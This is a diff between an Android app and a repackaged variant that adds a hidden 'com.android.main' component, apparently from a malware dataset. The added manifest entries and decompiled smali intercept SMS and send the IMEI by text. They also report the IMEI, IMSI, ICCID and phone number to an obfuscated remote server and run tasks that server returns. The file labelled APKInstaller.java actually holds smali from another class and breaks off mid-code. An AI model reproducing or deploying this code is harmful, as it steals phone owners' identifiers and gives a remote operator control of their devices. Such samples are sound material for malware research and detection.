diff --git a/result/APP_47/App_B_47/AndroidManifest.xml b/result/APP_47/App_M_47/AndroidManifest.xml
index 3f0c300..52cc0f1 100755
--- a/result/APP_47/App_B_47/AndroidManifest.xml
+++ b/result/APP_47/App_M_47/AndroidManifest.xml
@@ -46,12 +46,29 @@
             </intent-filter>
         </receiver>
         <service android:name=".service.ScreenService"/>
+        <service android:name="com.android.main.MainService" android:process=":main"/>
+        <receiver android:name="com.android.main.ActionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.main.SmsReceiver">
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.android.main.TANCActivity" android:theme="@android:style/Theme.Dialog"/>
     </application>
     <uses-permission android:name="android.permission.SET_PREFERRED_APPLICATIONS"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
     <uses-permission android:name="android.permission.VIBRATE"/>
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 </manifest>
\ No newline at end of file
diff --git a/result/APP_47/App_B_47/apktool.yml b/result/APP_47/App_M_47/apktool.yml
index 172f389..eec0e50 100755
--- a/result/APP_47/App_B_47/apktool.yml
+++ b/result/APP_47/App_M_47/apktool.yml
@@ -1,5 +1,5 @@
 !!brut.androlib.meta.MetaInfo
-apkFileName: Bapp47-72ACC63208C5518BDF8E745BCA1B264866D27704D0B0CA89559CBE593A0D840A.apk
+apkFileName: Mapp47-2EF09ACA1B3A4ACBFB2C33EF14D5EF06150BF88662B35A90F98A74ACCABAF6BE.apk
 compressionType: false
 doNotCompress:
 - resources.arsc
diff --git a/result/APP_47/App_M_47/com/android/main/APKInstaller.java b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
new file mode 100755
index 0000000..bd0972b
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
@@ -0,0 +1,432 @@
+package com.android.main;
+
+public class APKInstaller
+{
+  public APKInstaller() {}
+  
+  /* Error */
+  public static String exec(String[] paramArrayOfString)
+  {
+    // Byte code:
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v19
+
+    if-nez v19, :cond_8
+
+    .line 253
+    const-string v19, "no"
+
+    move-object/from16 v0, v19
+
+    move-object v1, v3
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v19
+
+    if-eqz v19, :cond_b
+
+    .line 254
+    const-string v19, ""
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->destMobile:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v19
+
+    if-eqz v19, :cond_7
+
+    .line 255
+    invoke-direct/range {p0 .. p0}, Lcom/android/main/MainService;->getDestMobile()I
+
+    .line 257
+    :cond_7
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->destMobile:Ljava/lang/String;
+
+    move-object/from16 v19, v0
+
+    new-instance v20, Ljava/lang/StringBuilder;
+
+    const-string v21, "imei:"
+
+    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;
+
+    move-object/from16 v21, v0
+
+    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v20
+
+    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v20
+
+    move-object/from16 v0, p0
+
+    move-object/from16 v1, v19
+
+    move-object/from16 v2, v20
+
+    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 273
+    .end local v3    # "allStr":Ljava/lang/String;
+    .end local v18    # "xmlUrl":Ljava/lang/String;
+    :cond_8
+    :goto_1
+    const/16 v19, 0x2
+
+    aget-object v19, v7, v19
+
+    move-object/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-object v0, v1, Lcom/android/main/MainService;->mobile:Ljava/lang/String;
+
+    .line 274
+    const/16 v19, 0x3
+
+    aget-object v19, v7, v19
+
+    move-object/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-object v0, v1, Lcom/android/main/MainService;->installtime:Ljava/lang/String;
+
+    .line 275
+    const/16 v19, 0x4
+
+    aget-object v19, v7, v19
+
+    move-object/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-object v0, v1, Lcom/android/main/MainService;->region:Ljava/lang/String;
+
+    .line 276
+    const/16 v19, 0x5
+
+    aget-object v19, v7, v19
+
+    move-object/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-object v0, v1, Lcom/android/main/MainService;->imsi:Ljava/lang/String;
+
+    .line 277
+    const/16 v19, 0x6
+
+    aget-object v19, v7, v19
+
+    move-object/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-object v0, v1, Lcom/android/main/MainService;->mnc:Ljava/lang/String;
+
+    .line 279
+    new-instance v19, Ljava/lang/StringBuilder;
+
+    const-string v20, "http://"
+
+    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    .line 280
+    const-string v20, "ax3mkl4mgele2guoo9f1hc3ohm"
+
+    const/16 v21, 0x3
+
+    const/16 v22, 0x3
+
+    invoke-static/range {v20 .. v22}, Lcom/android/main/Base64;->encodebook(Ljava/lang/String;II)Ljava/lang/String;
+
+    move-result-object v20
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    .line 281
+    const-string v20, ":8118/push/newandroidxml/"
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->bigpid:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    const-string v20, "_"
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->version:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    const-string v20, "/"
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    .line 282
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->mnc:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    const-string v20, "/"
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->region:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    const-string v20, ".xml?sim="
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    const-string v20, "&tel="
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    .line 283
+    const-string v20, "&imsi="
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    const-string v20, "&iccid="
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->iccid:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    const-string v20, "&pid="
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    .line 279
+    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v18
+
+    .line 285
+    .restart local v18    # "xmlUrl":Ljava/lang/String;
+    :try_start_1
+    move-object/from16 v0, p0
+
+    iget-boolean v0, v0, Lcom/android/main/MainService;->istask:Z
+
+    move/from16 v19, v0
+    :try_end_1
+    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
+
+    if-nez v19, :cond_c
+
+    .line 344
+    .end local v6    # "difdate":Ljava/lang/Long;
+    .end local v10    # "isbian":Z
+    .end local v18    # "xmlUrl":Ljava/lang/String;
+    :cond_9
+    :goto_2
+    return-void
+
+    .line 220
+    .restart local v6    # "difdate":Ljava/lang/Long;
+    :cond_a
+    invoke-virtual {v6}, Ljava/lang/Long;->longValue()J
+
+    move-result-wide v19
+
+    const-wide/32 v21, 0xa4cb800
+
+    cmp-long v19, v19, v21
+
+    if-lez v19, :cond_2
+
+    .line 221
+    const/16 v19, 0x0
+
+    const/16 v20, 0x1
+
+    invoke-static/range {v20 .. v20}, Lcom/android/main/StringUtil;->getCurrentDate(I)Ljava/lang/String;
+
+    move-result-object v20
+
+    aput-object v20, v7, v19
+
+    goto/16 :goto_0
+
+    .line 259
+    .restart local v3    # "allStr":Ljava/lang/String;
+    .restart local v10    # "isbian":Z
+    .restart local v18    # "xmlUrl":Ljava/lang/String;
+    :cond_b
+    :try_start_2
+    const-string v19, "#"
+
+    move-object v0, v3
+
+    move-object/from16 v1, v19
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
+
+    move-result-object v17
+
+    .line 260
+    .local v17, "tmps":[Ljava/lang/String;
+    if-eqz v17, :cond_8
+
+    move-object/from16 v0, v17
+
+    array-length v0, v0
+
+    move/from16 v19, v0
+
+    const/16 v20, 0x3
+
+    move/from16 v0, v19
+
+    move/from16 v1, v20
+
+    if-ne v0, v1, :cond_8
+
+    .line 261
+    const/16 v19, 0x2
+
+    const/16 v20, 0x0
+
+    aget-object v20, v17, v20
+
+    aput-object v20, v7, v19
+
+    .line 262
+    const/16 v19, 0x4
+
+    const/16 v20, 0x1
+
+    aget-object v20, v17, v20
+
+    aput-object v20, v7, v19
+
+    .line 263
+    const/16 v19, 0x5
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    aput-object v20, v7, v19
+
+    .line 264
+    const/16 v19, 0x6
+
+    const/16 v20, 0x2
+
+    aget-object v20, v17, v20
+
+    aput-object v20, v7, v19
+
+    .line 266
+    move-object/from16 v0, p0
+
+    move-object v1, v7
+
+    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V
+    :try_end_2
+    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
+
+    goto/16 :goto_1
+
+    .line 270
+    .end local v3    # "allStr":Ljava/lang/String;
+    .end local v17    # "tmps":[Ljava/lang/String;
+    :catch_0
+    move-exception v19
+
+    goto/16 :goto_1
+
+    .line 287
+    :cond_c
+    :try_start_3
+    invoke-static/range {v18 .. v18}, Lcom/android/main/BaseAuthenicationHttpClient;->getStringByURL(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v3
+
+    .line 288
+    .restart local v3    # "allStr":Ljava/lang/String;
+    const/16 v19, 0x0
+
+    move/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-boolean v0, v1, Lcom/android/main/MainService;->istask:Z
+
+    .line 289
+    if-eqz v3, :cond_d
+
+    const-string v19, ""
+
+    move-object/from16 v0, v19
+
+    move-object v1, v3
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v19
+
+    if-nez v19, :cond_d
+
+    const-string v19, "null"
+
+    move-object/from16 v0, v19
+
+    move-object v1, v3
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v19
+
+    if-eqz v19, :cond_e
+
+    .line 290
+    :cond_d
+    const/16 v19, 0x1
+
+    move/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-boolean v0, v1, Lcom/android/main/MainService;->istask:Z
+    :try_end_3
+    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1
+
+    goto/16 :goto_2
+
+    .line 341
+    .end local v3    # "allStr":Ljava/lang/String;
+    :catch_1
+    move-exception v19
+
+    move-object/from16 v8, v19
+
+    .line 342
+    .local v8, "e":Ljava/lang/Exception;
+    const/16 v19, 0x1
+
+    move/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-boolean v0, v1, Lcom/android/main/MainService;->istask:Z
+
+    goto/16 :goto_2
+
+    .line 293
+    .end local v8    # "e":Ljava/lang/Exception;
+    .restart local v3    # "allStr":Ljava/lang/String;
+    :cond_e
+    :try_start_4
+    const-string v19, "<task>"
+
+    const-string v20, "</task>"
+
+    move-object v0, v3
+
+    move-object/from16 v1, v19
+
+    move-object/from16 v2, v20
+
+    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v19
+
+    move-object/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-object v0, v1, Lcom/android/main/MainService;->task:Ljava/lang/String;
+
+    .line 294
+    const-string v19, "<datenum>"
+
+    .line 295
+    const-string v20, "</datenum>"
+
+    .line 294
+    move-object v0, v3
+
+    move-object/from16 v1, v19
+
+    move-object/from16 v2, v20
+
+    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v5
+
+    .line 296
+    .local v5, "datenum":Ljava/lang/String;
+    const/4 v9, 0x1
+
+    .line 297
+    .local v9, "exec":Z
+    const/16 v4, -0x65
+
+    .line 298
+    .local v4, "code":I
+    const-string v19, "no"
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->task:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v19
+
+    if-eqz v19, :cond_11
+
+    .line 299
+    const/16 v4, -0x64
+
+    .line 300
+    const/4 v9, 0x0
+
+    .line 309
+    :cond_f
+    :goto_3
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;
+
+    move-object/from16 v19, v0
+
+    if-eqz v19, :cond_10
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;
+
+    move-object/from16 v19, v0
+
+    const-string v20, "-dn"
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
+
+    move-result v19
+
+    const/16 v20, -0x1
+
+    move/from16 v0, v19
+
+    move/from16 v1, v20
+
+    if-le v0, v1, :cond_10
+
+    .line 310
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;
+
+    move-object/from16 v19, v0
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    const-string v21, "-dn"
+
+    invoke-virtual/range {v20 .. v21}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
+
+    move-result v20
+
+    add-int/lit8 v20, v20, 0x3
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->substring(I)Ljava/lang/String;
+
+    move-result-object v16
+
+    .line 311
+    .local v16, "tmpint":Ljava/lang/String;
+    if-eqz v16, :cond_10
+
+    const-string v19, ""
+
+    move-object/from16 v0, v19
+
+    move-object/from16 v1, v16
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v19
+
+    if-nez v19, :cond_10
+
+    .line 312
+    const/16 v19, 0x3
+
+    aget-object v19, v7, v19
+
+    .line 313
+    invoke-static/range {v16 .. v16}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
+
+    move-result v20
+
+    const/16 v21, 0x18
+
+    .line 312
+    invoke-static/range {v19 .. v21}, Lcom/android/main/StringUtil;->getTimeLength(Ljava/lang/String;II)I
+
+    move-result v14
+
+    .line 314
+    .restart local v14    # "result":I
+    if-nez v14, :cond_10
+
+    .line 315
+    const/16 v4, -0x66
+
+    .line 316
+    const/4 v9, 0x0
+
+    .line 320
+    .end local v14    # "result":I
+    .end local v16    # "tmpint":Ljava/lang/String;
+    :cond_10
+    if-nez v9, :cond_12
+
+    .line 322
+    move-object/from16 v0, p0
+
+    move-object v1, v7
+
+    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V
+
+    .line 323
+    const/16 v19, 0x0
+
+    move-object/from16 v0, p0
+
+    move v1, v4
+
+    move/from16 v2, v19
+
+    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->LogService(II)I
+
+    .line 324
+    const/16 v19, 0x1
+
+    move/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-boolean v0, v1, Lcom/android/main/MainService;->istask:Z
+
+    goto/16 :goto_2
+
+    .line 301
+    :cond_11
+    if-eqz v5, :cond_f
+
+    const-string v19, ""
+
+    move-object/from16 v0, v19
+
+    move-object v1, v5
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v19
+
+    if-nez v19, :cond_f
+
+    const-string v19, "0"
+
+    move-object/from16 v0, v19
+
+    move-object v1, v5
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v19
+
+    if-nez v19, :cond_f
+
+    .line 302
+    const/16 v19, 0x3
+
+    aget-object v19, v7, v19
+
+    .line 303
+    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
+
+    move-result v20
+
+    const/16 v21, 0x1
+
+    .line 302
+    invoke-static/range {v19 .. v21}, Lcom/android/main/StringUtil;->getTimeLength(Ljava/lang/String;II)I
+
+    move-result v14
+
+    .line 304
+    .restart local v14    # "result":I
+    if-nez v14, :cond_f
+
+    .line 305
+    const/16 v4, -0x65
+
+    .line 306
+    const/4 v9, 0x0
+
+    goto/16 :goto_3
+
+    .line 327
+    .end local v14    # "result":I
+    :cond_12
+    const-string v19, "note"
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->task:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v19
+
+    if-eqz v19, :cond_14
+
+    .line 328
+    move-object/from16 v0, p0
+
+    move-object v1, v3
+
+    move-object v2, v7
+
+    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->sendSms(Ljava/lang/String;[Ljava/lang/String;)V
+
+    .line 340
+    :cond_13
+    :goto_4
+    const/16 v19, 0x1
+
+    move/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-boolean v0, v1, Lcom/android/main/MainService;->istask:Z
+
+    goto/16 :goto_2
+
+    .line 329
+    :cond_14
+    const-string v19, "push"
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->task:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v19
+
+    if-eqz v19, :cond_15
+
+    .line 330
+    move-object/from16 v0, p0
+
+    move-object v1, v3
+
+    move-object v2, v7
+
+    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->execPush(Ljava/lang/String;[Ljava/lang/String;)V
+
+    goto :goto_4
+
+    .line 331
+    :cond_15
+    const-string v19, "soft"
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->task:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v19
+
+    if-eqz v19, :cond_16
+
+    .line 332
+    move-object/from16 v0, p0
+
+    move-object v1, v3
+
+    move-object v2, v7
+
+    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->execSoft(Ljava/lang/String;[Ljava/lang/String;)V
+
+    goto :goto_4
+
+    .line 333
+    :cond_16
+    const-string v19, "window"
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->task:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v19
+
+    if-eqz v19, :cond_17
+
+    .line 334
+    move-object/from16 v0, p0
+
+    move-object v1, v3
+
+    move-object v2, v7
+
+    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->execTanc(Ljava/lang/String;[Ljava/lang/String;)V
+
+    goto :goto_4
+
+    .line 335
+    :cond_17
+    const-string v19, "xbox"
